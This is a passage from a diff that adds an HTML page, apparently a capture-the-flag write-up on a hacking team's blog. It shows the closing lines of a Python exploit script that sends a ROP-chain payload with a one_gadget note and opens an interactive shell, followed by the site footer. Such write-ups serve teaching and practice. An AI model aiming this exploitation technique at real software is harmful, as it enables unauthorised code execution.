+</span></span><span style=display:flex><span>        exe<span style=color:#f92672>.</span>bss(<span style=color:#ae81ff>100</span>),  <span style=color:#75715e># one_gadget also requires a writeable rbp - 0x78</span>
+</span></span><span style=display:flex><span>        rop<span style=color:#f92672>.</span>chain(),  <span style=color:#75715e># rop chain</span>
+</span></span><span style=display:flex><span>    )
+</span></span><span style=display:flex><span>    vfs(<span style=color:#ae81ff>10</span>, payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>interactive()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    main()
+</span></span></code></pre></div></div></article></main></div><footer class=footer><div class=footer__inner><div class=footer__content><span>&copy; 2022</span>
+<span><a href=https://madrhacks.github.io/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span></div></div><div class=footer__inner><div class=footer__content><span>Powered by <a href=http://gohugo.io>Hugo</a></span>
+<span>Made with &#10084;</span></div></div></footer></div><script type=text/javascript src=https://madrhacks.github.io/bundle.min.fbf016a5f89be88f4916a0898302f777692ee6600991c3b6108fc423ed982dc83b470742cc92dd796861136f5ca96988b35e049b5f4cb4b1343686784a58c8ce.js integrity="sha512-+/AWpfib6I9JFqCJgwL3d2ku5mAJkcO2EI/EI+2YLcg7RwdCzJLdeWhhE29cqWmIs14Em19MtLE0NoZ4SljIzg=="></script></body></html>
